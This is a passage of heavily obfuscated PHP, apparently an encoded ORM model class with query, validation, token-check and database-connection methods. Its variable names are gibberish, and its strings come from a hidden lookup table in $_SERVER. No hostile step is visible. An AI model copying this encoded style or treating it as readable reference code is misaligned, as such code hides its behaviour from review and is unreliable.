$Í•ò¥ˆŞ[$Â¼—ò•ü] = array($¬ºîŞÌÄ[356], $éô—ÕÌÅ); } else { $Í•ò¥ˆŞ[$Â¼—ò•ü] = $éô—ÕÌÅ; } $this->options[$¬ºîŞÌÄ[355]] = $Í•ò¥ˆŞ; } elseif (!1 === $éô—ÕÌÅ) { $éô—ÕÌÅ = $this->_parseOptions(); return $¬ºîŞÌÄ[357] . $this->db->buildSelectSql($éô—ÕÌÅ) . $¬ºîŞÌÄ[358]; } $éô—ÕÌÅ = $this->_parseOptions(); $´åÇ®ç† = $this->db->select($éô—ÕÌÅ); if (!1 === $´åÇ®ç†) { return !1; } if (empty($´åÇ®ç†)) { return null; } $this->_afterSelect($´åÇ®ç†, $éô—ÕÌÅ); return $´åÇ®ç†; } protected function _afterSelect(&$İ”×ù³‹, $Š¼”ì) { } public function buildSql($ÅæÌú¤ = array()) { $“Ÿ™ä„ =& $_SERVER[¯‘·½]; $ÅæÌú¤ = $this->_parseOptions($ÅæÌú¤); return $“Ÿ™ä„[357] . $this->db->buildSelectSql($ÅæÌú¤) . $“Ÿ™ä„[358]; } public function optionsValue($òô°‰‰÷ = null) { if (is_null($òô°‰‰÷)) { return $this->options; } elseif (is_array($òô°‰‰÷)) { $this->options = array_merge($this->options, $òô°‰‰÷); } } protected function _parseOptions($Ğ—ú©æü = array()) { $¸şşöÄÕ =& $_SERVER[¯‘·½]; if (is_array($Ğ—ú©æü)) { $Ğ—ú©æü = array_merge($this->options, $Ğ—ú©æü); } $this->options = array(); if (!isset($Ğ—ú©æü[$¸şşöÄÕ[359]])) { $Ğ—ú©æü[$¸şşöÄÕ[359]] = $this->getTableName(); $¦£Îãš = $this->fields; } else { $¦£Îãš = $this->getDbFields(); } if (!empty($Ğ—ú©æü[$¸şşöÄÕ[360]])) { $Ğ—ú©æü[$¸şşöÄÕ[359]] .= $¸şşöÄÕ[53] . $Ğ—ú©æü[$¸şşöÄÕ[360]]; } $Ğ—ú©æü[$¸şşöÄÕ[361]] = $this->name; if (isset($Ğ—ú©æü[$¸şşöÄÕ[355]]) && is_array($Ğ—ú©æü[$¸şşöÄÕ[355]]) && !empty($¦£Îãš) && !isset($Ğ—ú©æü[$¸şşöÄÕ[362]]) && !isset($Ğ—ú©æü[$¸şşöÄÕ[359]])) { foreach ($Ğ—ú©æü[$¸şşöÄÕ[355]] as $ºº«Íé => $¢—¥åº) { $ºº«Íé = trim($ºº«Íé); if (in_array($ºº«Íé, $¦£Îãš, !0)) { if (is_scalar($¢—¥åº)) { $this->_parseType($Ğ—ú©æü[$¸şşöÄÕ[355]], $ºº«Íé); } } elseif (!is_numeric($ºº«Íé) && $¸şşöÄÕ[11] != substr($ºº«Íé, 0, 1) && !1 === strpos($ºº«Íé, $¸şşöÄÕ[10]) && !1 === strpos($ºº«Íé, $¸şşöÄÕ[340]) && !1 === strpos($ºº«Íé, $¸şşöÄÕ[215]) && !1 === strpos($ºº«Íé, $¸şşöÄÕ[287])) { unset($Ğ—ú©æü[$¸şşöÄÕ[355]][$ºº«Íé]); } } } $this->_options_filter($Ğ—ú©æü); return $Ğ—ú©æü; } protected function _options_filter(&$ñ£²‘ˆ) { } protected function _parseType(&$ç¬ÜÀøœ, $¡†Éëñª) { $Êõò¬Ÿƒ =& $_SERVER[¯‘·½]; if (empty($this->options[$Êõò¬Ÿƒ[363]][$Êõò¬Ÿƒ[4] . $¡†Éëñª])) { $‚úŞÅÈ = strtolower($this->fields[$Êõò¬Ÿƒ[332]][$¡†Éëñª]); if (!1 !== strpos($‚úŞÅÈ, $Êõò¬Ÿƒ[364])) { } elseif (!1 === strpos($‚úŞÅÈ, $Êõò¬Ÿƒ[365]) && !1 !== strpos($‚úŞÅÈ, $Êõò¬Ÿƒ[366])) { $ç¬ÜÀøœ[$¡†Éëñª] = intval($ç¬ÜÀøœ[$¡†Éëñª]); } elseif (!1 !== strpos($‚úŞÅÈ, $Êõò¬Ÿƒ[367]) || !1 !== strpos($‚úŞÅÈ, $Êõò¬Ÿƒ[368])) { $ç¬ÜÀøœ[$¡†Éëñª] = floatval($ç¬ÜÀøœ[$¡†Éëñª]); } elseif (!1 !== strpos($‚úŞÅÈ, $Êõò¬Ÿƒ[369])) { $ç¬ÜÀøœ[$¡†Éëñª] = (bool) $ç¬ÜÀøœ[$¡†Éëñª]; } } } public function find($é†˜¬ä© = array()) { $‘‘Úé˜² =& $_SERVER[¯‘·½]; if (is_numeric($é†˜¬ä©) || is_string($é†˜¬ä©)) { $´„§§Ö[$this->getPk()] = intval($é†˜¬ä©); $this->options[$‘‘Úé˜²[355]] = $´„§§Ö; } $this->options[$‘‘Úé˜²[370]] = 1; $é†˜¬ä© = $this->_parseOptions(); $ñÏüá¯ü = $this->db->select($é†˜¬ä©); if (!1 === $ñÏüá¯ü) { return !1; } if (empty($ñÏüá¯ü)) { return null; } $¿ĞâÓ = $ñÏüá¯ü[0]; $this->_afterFind($¿ĞâÓ, $é†˜¬ä©); return $¿ĞâÓ; } protected function _afterFind(&$…µÊõ×¢, $àÄ©§š÷) { } protected function returnResult($úÊ’Õ, $ƒˆÛÆ¯Ï = '') { $õŠ†Å©‚ =& $_SERVER[¯‘·½]; if ($ƒˆÛÆ¯Ï) { if (is_callable($ƒˆÛÆ¯Ï)) { return call_user_func($ƒˆÛÆ¯Ï, $úÊ’Õ); } switch (strtolower($ƒˆÛÆ¯Ï)) { case $õŠ†Å©‚[371]: return json_encode($úÊ’Õ); case $õŠ†Å©‚[372]: return xml_encode($úÊ’Õ); } } return $úÊ’Õ; } public function parseFieldsMap($¨ÌˆäÁü, $—ÏÆª¿ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $İŒŒªîç => $Ì×Öá»å) { if ($—ÏÆª¿ == 1) { if (isset($¨ÌˆäÁü[$Ì×Öá»å])) { $¨ÌˆäÁü[$İŒŒªîç] = $¨ÌˆäÁü[$Ì×Öá»å]; unset($¨ÌˆäÁü[$Ì×Öá»å]); } } else { if (isset($¨ÌˆäÁü[$İŒŒªîç])) { $¨ÌˆäÁü[$Ì×Öá»å] = $¨ÌˆäÁü[$İŒŒªîç]; unset($¨ÌˆäÁü[$İŒŒªîç]); } } } } return $¨ÌˆäÁü; } public function setField($œâ·£Š, $±±ÒÌ´¤ = '') { if (is_array($œâ·£Š)) { $°´ÃÓ³¹ = $œâ·£Š; } else { $°´ÃÓ³¹[$œâ·£Š] = $±±ÒÌ´¤; } return $this->save($°´ÃÓ³¹); } public function setAdd($¿ôÎ÷şï, $Şù™ Ïœ = 1) { $§àëõ…Õ =& $_SERVER[¯‘·½]; $üƒ€±™Ê = $¿ôÎ÷şï . $§àëõ…Õ[373] . $Şù™ Ïœ; if ($Şù™ Ïœ < 0) { $üƒ€±™Ê = $¿ôÎ÷şï . $Şù™ Ïœ; } return $this->setField($¿ôÎ÷şï, array($§àëõ…Õ[374], $üƒ€±™Ê)); } public function getField($İÓËµ‘Î, $ÜÌøíÁ = null) { $²ãƒ•µ¡ =& $_SERVER[¯‘·½]; $¿Ó×î¶œ[$²ãƒ•µ¡[353]] = $İÓËµ‘Î; $¿Ó×î¶œ = $this->_parseOptions($¿Ó×î¶œ); $İÓËµ‘Î = trim($İÓËµ‘Î); if (strpos($İÓËµ‘Î, $²ãƒ•µ¡[50])) { if (!isset($¿Ó×î¶œ[$²ãƒ•µ¡[370]])) { $¿Ó×î¶œ[$²ãƒ•µ¡[370]] = is_numeric($ÜÌøíÁ) ? $ÜÌøíÁ : $²ãƒ•µ¡[12]; } $—§éÆ­ = $this->db->select($¿Ó×î¶œ); if (!empty($—§éÆ­)) { $›îâğæÎ = explode($²ãƒ•µ¡[50], $İÓËµ‘Î); $İÓËµ‘Î = array_keys($—§éÆ­[0]); $«Ãµ„ù = array_shift($İÓËµ‘Î); $­ÇçÛ‰¨ = array_shift($İÓËµ‘Î); $¢æî»Ô = array(); $§èØ²À = count($›îâğæÎ); foreach ($—§éÆ­ as $àæÛ—†Ã) { $œ‘²Á¹Š = $àæÛ—†Ã[$«Ãµ„ù]; if (2 == $§èØ²À) { $¢æî»Ô[$œ‘²Á¹Š] = $àæÛ—†Ã[$­ÇçÛ‰¨]; } else { $¢æî»Ô[$œ‘²Á¹Š] = is_string($ÜÌøíÁ) ? implode($ÜÌøíÁ, $àæÛ—†Ã) : $àæÛ—†Ã; } } return $¢æî»Ô; } } else { if (!0 !== $ÜÌøíÁ) { $¿Ó×î¶œ[$²ãƒ•µ¡[370]] = is_numeric($ÜÌøíÁ) ? $ÜÌøíÁ : 1; } if ($ÜÌøíÁ === $²ãƒ•µ¡[335]) { unset($¿Ó×î¶œ[$²ãƒ•µ¡[370]]); } $àæÛ—†Ã = $this->db->select($¿Ó×î¶œ); if (!empty($àæÛ—†Ã)) { if ($ÜÌøíÁ === $²ãƒ•µ¡[335]) { return reset($àæÛ—†Ã[0]); } if (!0 !== $ÜÌøíÁ && 1 == $¿Ó×î¶œ[$²ãƒ•µ¡[370]]) { return reset($àæÛ—†Ã[0]); } foreach ($àæÛ—†Ã as $·ËôåË) { $´Óù×¨²[] = $·ËôåË[$İÓËµ‘Î]; } return $´Óù×¨²; } } return null; } public function create($ìÀäé¡« = '', $ä²”ÛôÌ = '') { $Ş®º‰ÕË =& $_SERVER[¯‘·½]; if (empty($ìÀäé¡«)) { $ìÀäé¡« = $_POST; } elseif (is_object($ìÀäé¡«)) { $ìÀäé¡« = get_object_vars($ìÀäé¡«); } if (empty($ìÀäé¡«) || !is_array($ìÀäé¡«)) { $this->error = think_lang($Ş®º‰ÕË[351]); return !1; } $ìÀäé¡« = $this->parseFieldsMap($ìÀäé¡«, 0); $ä²”ÛôÌ = $ä²”ÛôÌ ? $ä²”ÛôÌ : (!empty($ìÀäé¡«[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Ş®º‰ÕË[353]])) { $Ô–Ş€¹° = $this->options[$Ş®º‰ÕË[353]]; unset($this->options[$Ş®º‰ÕË[353]]); } elseif ($ä²”ÛôÌ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Ô–Ş€¹° = $this->insertFields; } elseif ($ä²”ÛôÌ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Ô–Ş€¹° = $this->updateFields; } if (isset($Ô–Ş€¹°)) { if (is_string($Ô–Ş€¹°)) { $Ô–Ş€¹° = explode($Ş®º‰ÕË[50], $Ô–Ş€¹°); } if (think_config($Ş®º‰ÕË[375])) { $Ô–Ş€¹°[] = think_config($Ş®º‰ÕË[376]); } foreach ($ìÀäé¡« as $ã¨¹Ãºé => $‡ßå›“) { if (!in_array($ã¨¹Ãºé, $Ô–Ş€¹°)) { unset($ìÀäé¡«[$ã¨¹Ãºé]); } } } if (!$this->autoValidation($ìÀäé¡«, $ä²”ÛôÌ)) { return !1; } if (!$this->autoCheckToken($ìÀäé¡«)) { $this->error = think_lang($Ş®º‰ÕË[377]); return !1; } if ($this->autoCheckFields) { $Ô–Ş€¹° = $this->getDbFields(); foreach ($ìÀäé¡« as $ã¨¹Ãºé => $‡ßå›“) { if (!in_array($ã¨¹Ãºé, $Ô–Ş€¹°)) { unset($ìÀäé¡«[$ã¨¹Ãºé]); } elseif (MAGIC_QUOTES_GPC && is_string($‡ßå›“)) { $ìÀäé¡«[$ã¨¹Ãºé] = stripslashes($‡ßå›“); } } } $this->autoOperation($ìÀäé¡«, $ä²”ÛôÌ); $this->data = $ìÀäé¡«; return $ìÀäé¡«; } public function autoCheckToken($™¥™ŞĞŞ) { $Œ³ÑÕ€¼ =& $_SERVER[¯‘·½]; if (isset($this->options[$Œ³ÑÕ€¼[378]]) && !$this->options[$Œ³ÑÕ€¼[378]]) { return !0; } if (think_config($Œ³ÑÕ€¼[375])) { $×ñ»¢§Å = think_config($Œ³ÑÕ€¼[376]); if (!isset($™¥™ŞĞŞ[$×ñ»¢§Å]) || Session::get($×ñ»¢§Å)) { return !1; } list($†ÎÅ·ÁÒ, $‘“ŞŞŸ) = explode($Œ³ÑÕ€¼[11], $™¥™ŞĞŞ[$×ñ»¢§Å]); if ($‘“ŞŞŸ && Session::get($×ñ»¢§Å . $Œ³ÑÕ€¼[10] . $†ÎÅ·ÁÒ) === $‘“ŞŞŸ) { Session::remove($×ñ»¢§Å . $Œ³ÑÕ€¼[10] . $†ÎÅ·ÁÒ); return !0; } if (think_config($Œ³ÑÕ€¼[379])) { Session::remove($×ñ»¢§Å . $Œ³ÑÕ€¼[10] . $†ÎÅ·ÁÒ); } return !1; } return !0; } public function regex($ñ¼­ÆÅñ, $ÆÕ“Äûê) { $”®¢”ª™ =& $_SERVER[¯‘·½]; $´ÃŠšõ£ = array($”®¢”ª™[380] => $”®¢”ª™[381], $”®¢”ª™[382] => $”®¢”ª™[383], $”®¢”ª™[384] => $”®¢”ª™[385], $”®¢”ª™[386] => $”®¢”ª™[387], $”®¢”ª™[388] => $”®¢”ª™[389], $”®¢”ª™[390] => $”®¢”ª™[391], $”®¢”ª™[392] => $”®¢”ª™[393], $”®¢”ª™[368] => $”®¢”ª™[394], $”®¢”ª™[395] => $”®¢”ª™[396]); if (isset($´ÃŠšõ£[strtolower($ÆÕ“Äûê)])) { $ÆÕ“Äûê = $´ÃŠšõ£[strtolower($ÆÕ“Äûê)]; } return preg_match($ÆÕ“Äûê, $ñ¼­ÆÅñ) === 1; } private function autoOperation(&$ŒÕõâÔ¤, $Û‹İğíØ) { $°‹³ÍÃ‡ =& $_SERVER[¯‘·½]; if (!empty($this->options[$°‹³ÍÃ‡[397]])) { $ú¯Ÿ¬£ = $this->options[$°‹³ÍÃ‡[397]]; unset($this->options[$°‹³ÍÃ‡[397]]); } elseif (!empty($this->_auto)) { $ú¯Ÿ¬£ = $this->_auto; } if (isset($ú¯Ÿ¬£)) { foreach ($ú¯Ÿ¬£ as $ÆÒ¯Í¡£) { if (empty($ÆÒ¯Í¡£[2])) { $ÆÒ¯Í¡£[2] = THINK_MODEL_INSERT; } if ($Û‹İğíØ == $ÆÒ¯Í¡£[2] || $ÆÒ¯Í¡£[2] == THINK_MODEL_BOTH) { switch (trim($ÆÒ¯Í¡£[3])) { case $°‹³ÍÃ‡[398]: case $°‹³ÍÃ‡[399]: $©ûîî°„ = isset($ÆÒ¯Í¡£[4]) ? (array) $ÆÒ¯Í¡£[4] : array(); if (isset($ŒÕõâÔ¤[$ÆÒ¯Í¡£[0]])) { array_unshift($©ûîî°„, $ŒÕõâÔ¤[$ÆÒ¯Í¡£[0]]); } if ($°‹³ÍÃ‡[398] == $ÆÒ¯Í¡£[3]) { $ŒÕõâÔ¤[$ÆÒ¯Í¡£[0]] = call_user_func_array($ÆÒ¯Í¡£[1], $©ûîî°„); } else { $ŒÕõâÔ¤[$ÆÒ¯Í¡£[0]] = call_user_func_array(array(&$this, $ÆÒ¯Í¡£[1]), $©ûîî°„); } break; case $°‹³ÍÃ‡[353]: $ŒÕõâÔ¤[$ÆÒ¯Í¡£[0]] = $ŒÕõâÔ¤[$ÆÒ¯Í¡£[1]]; break; case $°‹³ÍÃ‡[400]: if ($°‹³ÍÃ‡[12] === $ŒÕõâÔ¤[$ÆÒ¯Í¡£[0]]) { unset($ŒÕõâÔ¤[$ÆÒ¯Í¡£[0]]); } break; case $°‹³ÍÃ‡[401]: default: $ŒÕõâÔ¤[$ÆÒ¯Í¡£[0]] = $ÆÒ¯Í¡£[1]; } if (!1 === $ŒÕõâÔ¤[$ÆÒ¯Í¡£[0]]) { unset($ŒÕõâÔ¤[$ÆÒ¯Í¡£[0]]); } } } } return $ŒÕõâÔ¤; } protected function autoValidation($çÃãòÖ°, $¡ı™é»ğ) { $¼Ú¥‹Öß =& $_SERVER[¯‘·½]; if (!empty($this->options[$¼Ú¥‹Öß[402]])) { $ËÙ„” = $this->options[$¼Ú¥‹Öß[402]]; unset($this->options[$¼Ú¥‹Öß[402]]); } elseif (!empty($this->_validate)) { $ËÙ„” = $this->_validate; } if (isset($ËÙ„”)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ËÙ„” as $Æ„½÷Ÿ => $ÚãÁä¥é) { if (empty($ÚãÁä¥é[5]) || $ÚãÁä¥é[5] == THINK_MODEL_BOTH || $ÚãÁä¥é[5] == $¡ı™é»ğ) { if (0 == strpos($ÚãÁä¥é[2], $¼Ú¥‹Öß[403]) && strpos($ÚãÁä¥é[2], $¼Ú¥‹Öß[404])) { $ÚãÁä¥é[2] = think_lang(substr($ÚãÁä¥é[2], 2, -1)); } $ÚãÁä¥é[3] = isset($ÚãÁä¥é[3]) ? $ÚãÁä¥é[3] : THINK_EXISTS_VALIDATE; $ÚãÁä¥é[4] = isset($ÚãÁä¥é[4]) ? $ÚãÁä¥é[4] : $¼Ú¥‹Öß[405]; switch ($ÚãÁä¥é[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($çÃãòÖ°, $ÚãÁä¥é)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¼Ú¥‹Öß[12] != trim($çÃãòÖ°[$ÚãÁä¥é[0]])) { if (!1 === $this->_validationField($çÃãòÖ°, $ÚãÁä¥é)) { return !1; } } break; default: if (isset($çÃãòÖ°[$ÚãÁä¥é[0]])) { if (!1 === $this->_validationField($çÃãòÖ°, $ÚãÁä¥é)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ë·¦ú, $ô¬ıò€Ú) { if (!1 === $this->_validationFieldItem($ë·¦ú, $ô¬ıò€Ú)) { if ($this->patchValidate) { $this->error[$ô¬ıò€Ú[0]] = $ô¬ıò€Ú[2]; } else { $this->error = $ô¬ıò€Ú[2]; return !1; } } return; } protected function _validationFieldItem($Ú‚Ûøş¤, $ÅÕù“¶Ì) { $ä¾ÛØî÷ =& $_SERVER[¯‘·½]; switch (strtolower(trim($ÅÕù“¶Ì[4]))) { case $ä¾ÛØî÷[398]: case $ä¾ÛØî÷[399]: $Ú·£šış = isset($ÅÕù“¶Ì[6]) ? (array) $ÅÕù“¶Ì[6] : array(); if (is_string($ÅÕù“¶Ì[0]) && strpos($ÅÕù“¶Ì[0], $ä¾ÛØî÷[50])) { $ÅÕù“¶Ì[0] = explode($ä¾ÛØî÷[50], $ÅÕù“¶Ì[0]); } if (is_array($ÅÕù“¶Ì[0])) { foreach ($ÅÕù“¶Ì[0] as $šà–áã) { $ç•Ç¿¿ä[$šà–áã] = $Ú‚Ûøş¤[$šà–áã]; } array_unshift($Ú·£šış, $ç•Ç¿¿ä); } else { array_unshift($Ú·£šış, $Ú‚Ûøş¤[$ÅÕù“¶Ì[0]]); } if ($ä¾ÛØî÷[398] == $ÅÕù“¶Ì[4]) { return call_user_func_array($ÅÕù“¶Ì[1], $Ú·£šış); } else { return call_user_func_array(array(&$this, $ÅÕù“¶Ì[1]), $Ú·£šış); } case $ä¾ÛØî÷[406]: return $Ú‚Ûøş¤[$ÅÕù“¶Ì[0]] == $Ú‚Ûøş¤[$ÅÕù“¶Ì[1]]; case $ä¾ÛØî÷[407]: if (is_string($ÅÕù“¶Ì[0]) && strpos($ÅÕù“¶Ì[0], $ä¾ÛØî÷[50])) { $ÅÕù“¶Ì[0] = explode($ä¾ÛØî÷[50], $ÅÕù“¶Ì[0]); } $ä¿ÇÓ‰ = array(); if (is_array($ÅÕù“¶Ì[0])) { foreach ($ÅÕù“¶Ì[0] as $šà–áã) { $ä¿ÇÓ‰[$šà–áã] = $Ú‚Ûøş¤[$šà–áã]; } } else { $ä¿ÇÓ‰[$ÅÕù“¶Ì[0]] = $Ú‚Ûøş¤[$ÅÕù“¶Ì[0]]; } if (!empty($Ú‚Ûøş¤[$this->getPk()])) { $ä¿ÇÓ‰[$this->getPk()] = array($ä¾ÛØî÷[408], $Ú‚Ûøş¤[$this->getPk()]); } if ($this->where($ä¿ÇÓ‰)->find()) { return !1; } return !0; default: return $this->check($Ú‚Ûøş¤[$ÅÕù“¶Ì[0]], $ÅÕù“¶Ì[1], $ÅÕù“¶Ì[4]); } } public function check($»‡î¤Ã•, $Õ ¸ö§, $ºãÀÂ¥Ê = "\x72\x65\x67\x65\x78") { $ëêäù¢ö =& $_SERVER[¯‘·½]; $ºãÀÂ¥Ê = strtolower(trim($ºãÀÂ¥Ê)); switch ($ºãÀÂ¥Ê) { case $ëêäù¢ö[7]: case $ëêäù¢ö[409]: $ñ¥¢Æå  = is_array($Õ ¸ö§) ? $Õ ¸ö§ : explode($ëêäù¢ö[50], $Õ ¸ö§); return $ºãÀÂ¥Ê == $ëêäù¢ö[7] ? in_array($»‡î¤Ã•, $ñ¥¢Æå ) : !in_array($»‡î¤Ã•, $ñ¥¢Æå ); case $ëêäù¢ö[410]: case $ëêäù¢ö[411]: if (is_array($Õ ¸ö§)) { $‡¦û‰Å = $Õ ¸ö§[0]; $àïª“‘ó = $Õ ¸ö§[1]; } else { list($‡¦û‰Å, $àïª“‘ó) = explode($ëêäù¢ö[50], $Õ ¸ö§); } return $ºãÀÂ¥Ê == $ëêäù¢ö[410] ? $»‡î¤Ã• >= $‡¦û‰Å && $»‡î¤Ã• <= $àïª“‘ó : $»‡î¤Ã• < $‡¦û‰Å || $»‡î¤Ã• > $àïª“‘ó; case $ëêäù¢ö[412]: case $ëêäù¢ö[413]: return $ºãÀÂ¥Ê == $ëêäù¢ö[412] ? $»‡î¤Ã• == $Õ ¸ö§ : $»‡î¤Ã• != $Õ ¸ö§; case $ëêäù¢ö[414]: $ÖŸ’‘ ª = mb_strlen($»‡î¤Ã•, $ëêäù¢ö[415]); if (strpos($Õ ¸ö§, $ëêäù¢ö[50])) { list($‡¦û‰Å, $àïª“‘ó) = explode($ëêäù¢ö[50], $Õ ¸ö§); return $ÖŸ’‘ ª >= $‡¦û‰Å && $ÖŸ’‘ ª <= $àïª“‘ó; } else { return $ÖŸ’‘ ª == $Õ ¸ö§; } case $ëêäù¢ö[416]: list($‰ä’ê£Æ, $§Ÿ‰“•Ô) = explode($ëêäù¢ö[50], $Õ ¸ö§); if (!is_numeric($‰ä’ê£Æ)) { $‰ä’ê£Æ = strtotime($‰ä’ê£Æ); } if (!is_numeric($§Ÿ‰“•Ô)) { $§Ÿ‰“•Ô = strtotime($§Ÿ‰“•Ô); } return NOW_TIME >= $‰ä’ê£Æ && NOW_TIME <= $§Ÿ‰“•Ô; case $ëêäù¢ö[417]: return in_array(get_client_ip(), explode($ëêäù¢ö[50], $Õ ¸ö§)); case $ëêäù¢ö[418]: return !in_array(get_client_ip(), explode($ëêäù¢ö[50], $Õ ¸ö§)); case $ëêäù¢ö[405]: default: return $this->regex($»‡î¤Ã•, $Õ ¸ö§); } } public function query($ĞÛ„ì‡¸, $¤á°”¿æ = false) { $É“…¦á =& $_SERVER[¯‘·½]; if (!is_bool($¤á°”¿æ) && !is_array($¤á°”¿æ)) { $¤á°”¿æ = func_get_args(); array_shift($¤á°”¿æ); } $ĞÛ„ì‡¸ = str_replace(array($É“…¦á[288], $É“…¦á[419]), $É“…¦á[53], $ĞÛ„ì‡¸); $ĞÛ„ì‡¸ = $this->parseSql($ĞÛ„ì‡¸, $¤á°”¿æ); return $this->db->query($ĞÛ„ì‡¸); } public function execute($°æ´ñğÌ, $÷è—öåê = false) { if (!is_bool($÷è—öåê) && !is_array($÷è—öåê)) { $÷è—öåê = func_get_args(); array_shift($÷è—öåê); } $°æ´ñğÌ = $this->parseSql($°æ´ñğÌ, $÷è—öåê); return $this->db->execute($°æ´ñğÌ); } protected function parseSql($ÂÏª¦Í¤, $³À«©Ğ) { $ø•ˆ“¥Ì =& $_SERVER[¯‘·½]; if (!0 === $³À«©Ğ) { $ç‹ıÒÌç = $this->_parseOptions(); $ÂÏª¦Í¤ = $this->db->parseSql($ÂÏª¦Í¤, $ç‹ıÒÌç); } elseif (is_array($³À«©Ğ)) { $³À«©Ğ = array_map(array($this->db, $ø•ˆ“¥Ì[420]), $³À«©Ğ); $ÂÏª¦Í¤ = vsprintf($ÂÏª¦Í¤, $³À«©Ğ); } else { $ÂÏª¦Í¤ = strtr($ÂÏª¦Í¤, array($ø•ˆ“¥Ì[421] => $this->getTableName(), $ø•ˆ“¥Ì[422] => think_config($ø•ˆ“¥Ì[324]))); } $this->db->setModel($this->name); return $ÂÏª¦Í¤; } public function db($öá×½ùØ = '', $¶šì¿›å = '', $íéşØåš = array()) { $™Ø¸¬³Ø =& $_SERVER[¯‘·½]; if ($™Ø¸¬³Ø[12] === $öá×½ùØ && $this->db) { return $this->db; } static $ÛßÅœª÷ = array(); static $¿±ĞÍº½ = array(); if (!isset($¿±ĞÍº½[$öá×½ùØ]) || isset($¿±ĞÍº½[$öá×½ùØ]) && $¶šì¿›å && $ÛßÅœª÷[$öá×½ùØ] != $¶šì¿›å) { if (!empty($¶šì¿›å) && is_string($¶šì¿›å) && !1 === strpos($¶šì¿›å, $™Ø¸¬³Ø[8])) { $¶šì¿›å = think_config($¶šì¿›å); } $öá×½ùØ = think_guid($¶šì¿›å); $¿±ĞÍº½[$öá×½ùØ] = Db::getInstance($¶šì¿›å); } elseif (NULL === $¶šì¿›å) { $¿±ĞÍº½[$öá×½ùØ]->close(); unset($¿±ĞÍº½[$öá×½ùØ]); return; } if (!empty($íéşØåš)) { if (is_string($íéşØåš)) { parse_str($íéşØåš, $íéşØåš); } foreach ($íéşØåš as $ã‚°›„Æ => $Áì„šÔ–) { $this->setProperty($ã‚°›„Æ, $Áì„šÔ–); } } $ÛßÅœª÷[$öá×½ùØ] = $¶šì¿›å; $this->db = $¿±ĞÍº½[$öá×½ùØ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ò—à’š = get_class($this); if ($ò—à’š == $_SERVER[¯‘·½][423]) { return $this->name; } $this->name = substr($ò—à’š, 0, -5); } return $this->name; } public function getTableName() { $òğ‚‰’Ö =& $_SERVER[¯‘·½]; if (empty($this->trueTableName)) { $ú¶”ÊÒ© = !empty($this->tablePrefix) ? $this->tablePrefix : $òğ‚‰’Ö[12]; if (!empty($this->tableName)) { $ú¶”ÊÒ© .= $this->tableName; } else { $ú¶”ÊÒ© .= think_parse_name($this->name); } $this->trueTableName = strtolower($ú¶”ÊÒ©); } return (!empty($this->dbName) ? $this->dbName . $òğ‚‰’Ö[10] : $òğ‚‰’Ö[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $½Îô‹Ò =& $_SERVER[¯‘·½]; return isset($this->fields[$½Îô‹Ò[331]]) ? $this->fields[$½Îô‹Ò[331]] : $this->pk; } public function getDbFields() { $¶ñÀ®§± =& $_SERVER[¯‘·½]; if (isset($this->options[$¶ñÀ®§±[359]])) { $ÍûôéøÏ = $this->db->getFields($this->options[$¶ñÀ®§±[359]]); return $ÍûôéøÏ ? array_keys($ÍûôéøÏ) : !1; } if ($this->fields) { $ÍûôéøÏ = $this->fields; unset($ÍûôéøÏ[$¶ñÀ®§±[330]], $ÍûôéøÏ[$¶ñÀ®§±[331]], $ÍûôéøÏ[$¶ñÀ®§±[332]], $ÍûôéøÏ[$¶ñÀ®§±[329]]); return $ÍûôéøÏ; } return !1; } public function data($òªƒ‡ş = '') { $™Ä´ğ› =& $_SERVER[¯‘·½]; if ($™Ä´ğ›[12] === $òªƒ‡ş && !empty($this->data)) { return $this->data; } if (is_object($òªƒ‡ş)) { $òªƒ‡ş = get_object_vars($òªƒ‡ş); } elseif (is_string($òªƒ‡ş)) { parse_str($òªƒ‡ş, $òªƒ‡ş); } elseif (!is_array($òªƒ‡ş)) { think_exception(think_lang($™Ä´ğ›[351])); } $this->data = $òªƒ‡ş; return $this; } public function join($±›˜ÊÈŠ) { $‚îÊôÙŒ =& $_SERVER[¯‘·½]; if (is_array($±›˜ÊÈŠ)) { $this->options[$‚îÊôÙŒ[362]] = $±›˜ÊÈŠ; } elseif (!empty($±›˜ÊÈŠ)) { $this->options[$‚îÊôÙŒ[362]][] = $±›˜ÊÈŠ; } return $this; } public function union($°€Õ†æí, $çèÕıÖ = false) { $À–Ú¤‘¢ =& $_SERVER[¯‘·½]; if (empty($°€Õ†æí)) { return $this; } if ($çèÕıÖ) { $this->options[$À–Ú¤‘¢[424]][$À–Ú¤‘¢[425]] = !0; } if (is_object($°€Õ†æí)) { $°€Õ†æí = get_object_vars($°€Õ†æí); } if (is_string($°€Õ†æí)) { $¯Â¦ˆºŒ = $°€Õ†æí; } elseif (is_array($°€Õ†æí)) { if (isset($°€Õ†æí[0])) { $this->options[$À–Ú¤‘¢[424]] = array_merge($this->options[$À–Ú¤‘¢[424]], $°€Õ†æí); return $this; } else { $¯Â¦ˆºŒ = $°€Õ†æí; } } else { think_exception(think_lang($À–Ú¤‘¢[351])); } $this->options[$À–Ú¤‘¢[424]][] = $¯Â¦ˆºŒ; return $this; } public function cache($”Ù ¦ = true, $·öÄ Ï® = null, $à¾¢©± = '') { $òÔÅ»ü­ =& $_SERVER[¯‘·½]; if (!1 !== $”Ù ¦) { $this->options[$òÔÅ»ü­[426]] = array($òÔÅ»ü­[97] => $”Ù ¦, $òÔÅ»ü­[416] => $·öÄ Ï®, $òÔÅ»ü­[33] => $à¾¢©±); } return $this; } public function field($á­‹œÙ‹, $‚ñêÎß† = false) { $²öªëïú =& $_SERVER[¯‘·½]; if (!0 === $á­‹œÙ‹) { $Ú±ÁË¡Ÿ = $this->getDbFields(); $á­‹œÙ‹ = 